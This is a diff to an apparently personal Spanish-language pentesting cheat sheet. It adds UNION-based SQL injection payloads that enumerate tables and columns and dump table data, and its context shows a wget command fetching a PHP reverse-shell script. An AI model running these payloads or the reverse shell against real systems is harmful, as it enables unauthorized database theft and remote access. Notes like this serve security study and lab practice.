@@ -49,11 +49,25 @@ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/ph
 
 ## SQL Injection
 
-Columns enumeration (sustituir el numero correspondiente de la última columna por 'database()' para saber el nombre de la BBDD)
+Injección (sustituir el numero correspondiente de la última columna por 'database()' para saber el nombre de la BBDD)
 ```
 UNION SELECT 1,2,...
 ```
 
+### In-band
+
+Tables enumeration
+```
+UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'nombre_BBDD'
+```
+Columns of table enumeration
+```
+UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'nombre_tabla'
+```
+Table dumping
+```
+UNION SELECT 1,2,group_concat(columna1,':',columna2 SEPARATOR '<br>') FROM nombre_tabla
+```
 # Powershell
 
 Descargar binarios
